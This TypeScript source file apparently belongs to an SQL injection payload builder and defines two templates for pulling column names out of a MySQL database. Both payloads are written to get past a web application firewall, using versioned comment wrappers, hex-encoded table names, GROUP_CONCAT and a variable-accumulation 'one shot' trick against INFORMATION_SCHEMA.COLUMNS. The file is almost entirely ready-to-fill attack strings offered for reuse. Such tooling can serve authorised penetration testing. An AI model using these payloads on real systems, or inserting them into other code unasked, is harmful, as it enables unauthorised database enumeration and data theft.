import { BuilderSubcategory, TemplateConfig } from '../../types';

export const columnTemplates: TemplateConfig[] = [
  {
    id: 'waf-column-name-group-concat',
    name: 'COLUMN_NAME group_concat() WAF',
    description: 'WAF bypass column extraction with hex-encoded table name',
    content: '(/*!50000SELECT*//*!50000GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)*//*!50000FROM*//*!50000INFORMATION_SCHEMA.COLUMNS*//*!50000WHERE*//*!50000TABLE_NAME*/=0x7461626c655f6e616d65)',
    parameters: [
      {
        id: 'table_name',
        label: 'Table name',
        defaultValue: 'table_name',
        inputType: 'text'
      }
    ]
  },
  {
    id: 'waf-column-name-one-shot',
    name: 'COLUMN_NAME one shot() WAF',
    description: 'WAF bypass column one shot template',
    content: '(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM/*!50000(INFORMATION_SCHEMA.COLUMNS)*/WHERE(TABLE_NAME=0x7461626c655f6e616d65)AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)',
    parameters: [
      {
        id: 'table_name',
        label: 'Table name',
        defaultValue: 'table_name',
        inputType: 'text'
      }
    ]
  }
];

export const columnSubcategory: BuilderSubcategory = {
  id: 'column',
  label: 'Column',
  description: 'WAF bypass column extraction templates and parameter configurations',
  templates: columnTemplates
};

